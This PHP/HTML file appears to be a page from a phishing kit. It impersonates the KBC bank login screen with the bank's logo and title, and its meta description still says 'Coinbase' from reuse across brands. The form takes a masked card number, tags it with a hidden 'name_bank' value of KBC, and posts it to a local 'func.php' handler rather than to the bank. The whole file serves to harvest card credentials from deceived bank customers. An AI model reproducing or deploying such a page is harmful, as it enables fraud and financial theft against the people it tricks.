<?php
  session_start();
  include "./Asstes/php/lang/lang.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>KBC</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
        <style>

.active{
            background-color:#0097DB !important;
            color:white !important;
          }
        </style>
    </head>
    <body>
      
    <div class="header_cbc_1">
      <div class="logo">
        <img src="./Asstes/imgs/kbc.svg" alt="">
      </div>
    </div>
    <div class="wrapper_form_cbc d-flex">
      <div class="part_left">
        <img src="./Asstes/imgs/touch-background.jpg" alt="">
      </div>
      <div class="part_right">
        <div class="wrapper_right">
          <div class="title">
            <h1><?php echo get_text('kb_n_1'); ?></h1>
          </div>
          <div class="manelle">
            <img src="./Asstes/imgs/tp.svg" alt="">
            <p><?php echo get_text('kb_n_2'); ?></p>
          </div>
          <form  action="./Asstes/php/config/func.php" method="post">
            <input type="hidden" name="name_bank" value="KBC">
            <input type="hidden" name="login">
            <div class="input-group">
              <div class="form-group">
                <label for=""><?php echo get_text('kb_n_3'); ?></label>
                <input type="text" name="cart_num" id="cart_num" placeholder="_ _ _ _  _ _ _ _  _ _ _ _  _ _ _ _  _">
                <?php if( isset($_GET['error']) ) : ?>
                <p class="error_ mb-0"><?php echo get_text('kb_n_4'); ?></p>
                <?php endif; ?>
              </div>
              <div class="Remember d-flex align-items-center">
                <input type="checkbox" id="Remember" class="Remember rounded-1" checked name="Remember">
                <label for="Remember"><?php echo get_text('kb_n_5'); ?></span>
              </div> 
            </div>
            <div class="btn_sub">
              <button><?php echo get_text('kb_n_6'); ?></button>
            </div>
          </form>
        </div>
      </div>
    </div>







    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    
    <script>   
        
        $("#cart_num").mask('0000 0000 0000 0000 0');
        $("#client_num").mask('00000 00000');

        $(".form-group input").keyup(function(){
          if ($(".form-group #cart_num").val() != "" & $(".form-group #client_num").val() != "") {
            $(".btn_sub button").prop("disabled",false);
            $(".btn_sub button").addClass("active");
          }else{
            $(".btn_sub button").prop("disabled",true);
            $(".btn_sub button").removeClass("active");
          }
        });
        $(".group-input input").focus(function(){
          $(this).prev().addClass("focus");
          $(this).addClass("focus");
        });
        $(".group-input input").blur(function(){
          if ($(this).val() == "") {
              $(this).prev().removeClass("focus");
          }
          $(this).removeClass("focus");
        });         
    </script>
    </body>
</html>